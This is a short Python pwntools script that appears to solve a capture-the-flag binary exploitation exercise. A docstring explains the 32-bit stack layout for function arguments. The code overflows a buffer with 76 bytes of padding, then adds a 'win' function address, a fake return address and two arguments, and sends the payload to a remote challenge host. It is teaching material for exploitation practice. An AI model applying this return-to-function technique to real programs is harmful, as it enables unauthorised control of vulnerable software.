"""
This exercise is a build up from the previous exercise where you supply more arguments

for 32 bit programs, when you call a function, the arguments are pushed before calling the function.


| Function parameter 3	|
| Function parameter 2	|
| Function parameter 1	|
| Return Address 		|
| ebp					|

when we want to call a function with paramters we must simulate a normal function call by
adding a fake return address then adding the parameters.

"""

from pwn import *

def main():

	padding = b'A' * 76

	win = p32(0x080491c2)

	arg1 = p32(0xdeadbeef)

	arg2 = p32(0xcafebabe)

	payload = padding + win	+ b"AAAA" + arg1 + arg2

	#io = process('./doubletrouble')
	io = remote("challenge.ctf-fun.xyz", 14010)
	io.sendline(payload)

	io.interactive()

if __name__ == '__main__':
	main()